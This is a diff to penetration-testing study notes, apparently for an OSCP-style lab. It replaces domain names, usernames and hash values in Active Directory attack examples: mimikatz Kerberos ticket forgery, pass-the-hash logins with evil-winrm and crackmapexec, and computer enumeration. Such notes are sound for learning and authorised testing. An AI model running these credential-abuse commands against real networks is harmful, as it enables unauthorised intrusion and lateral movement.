@@ -713,7 +713,7 @@ Invoke-PrivescCheck -Extended -Report "privesccheck_$($env:COMPUTERNAME)"
    List all currently joined machine in the AD
    
    #+begin_example
-Get-ADComputer -Filter * -Properties Name -Server "medtech.com"
+Get-ADComputer -Filter * -Properties Name -Server "oscp.exam"
 Get-ADComputer -Filter * -Properties ipv4Address, OperatingSystem, OperatingSystemServicePack | Format-List name, ipv4*, oper*
    #+end_example
 
@@ -1058,7 +1058,7 @@ corp\jeff S-1-5-21-1987370270-658905905-1781884369-1105
     follows within mimikatz
 
     #+begin_example
-kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
+kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:5d28cf5252d32971419580a51484ca09 /user:geffadmin
     #+end_example
     
 *** Responder Net-NTLMv2 capture
@@ -1290,7 +1290,7 @@ Enter-PSSession 1
 
     #+begin_example
 proxychains evil-winrm -i 192.168.243.153 -u administrator -p Password
-proxychains evil-winrm -i 10.10.132.146 -u tom_admin -H 4979f69d4cb77845c075c41cf45f24dc
+proxychains evil-winrm -i 10.10.132.146 -u admin -H 4979f29d4cb99845c075c41cf45f24df
     #+end_example
 
 *** RDP
@@ -1356,7 +1356,7 @@ net localgroup "Remote Desktop Users" "test" /add
     - *crackmapexec*
 
       #+begin_example
-crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890893116990101307197052
+crackmapexec smb 192.168.242.147 -u web_svc -H 820d6348890293116990101307197053
       #+end_example
 
     - *evil-winrm*
